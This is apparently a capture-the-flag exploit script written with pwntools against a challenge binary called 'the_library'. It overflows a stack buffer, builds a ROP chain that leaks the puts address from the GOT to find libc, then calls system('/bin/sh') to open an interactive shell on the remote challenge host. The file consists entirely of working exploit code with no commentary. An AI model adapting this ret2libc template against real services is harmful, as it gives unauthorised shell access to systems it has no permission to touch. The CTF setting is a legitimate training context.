#!/usr/bin/python

from pwn import *

PATH = './the_library'

GDBSCRIPT = '''
b *0x0000000000401428
'''

HOST = 'challenge.ctf.games'
PORT = 31125

def debug(gdbscript):
    if type(r) == process:
        gdb.attach(r, gdbscript , gdb_args=["--init-eval-command='source ~/peda/peda.py'"])
        # gdb.attach(r, gdbscript , gdb_args=["--init-eval-command='source ~/.gdbinit_pwndbg'"])

def exploit(r):
    pop_rdi_ret = 0x0000000000401493 # pop rdi ; ret

    payload  = b'A' * 0x228
    payload += p64(pop_rdi_ret)
    payload += p64(elf.got['puts'])
    payload += p64(0x4010e0)
    payload += p64(elf.sym['main'])
    
    # debug(GDBSCRIPT)

    r.sendlineafter('> ', payload)
    r.recvuntil(b'Wrong :(\n')
    
    puts = u64(r.recvline(0).ljust(8, b'\0'))
    libc.address = puts - libc.sym['puts']

    info(hex(puts))
    info(hex(libc.address))

    str_bin_sh = libc.search(b'/bin/sh\0').__next__()

    payload  = b'A' * 0x228
    payload += p64(pop_rdi_ret)
    payload += p64(str_bin_sh)
    payload += p64(pop_rdi_ret + 1)
    payload += p64(libc.sym['system'])
    
    r.sendlineafter('> ', payload)
    

    r.interactive()

if __name__ == '__main__':
    elf  = ELF(PATH)
    libc = ELF('/home/abdullahnz/debug/ubuntu-20.04/libc64/libc.so.6', checksec=False)

    if args.REMOTE:
        r = remote(HOST, PORT)
    else:
        r = process(PATH, aslr=0)
    exploit(r)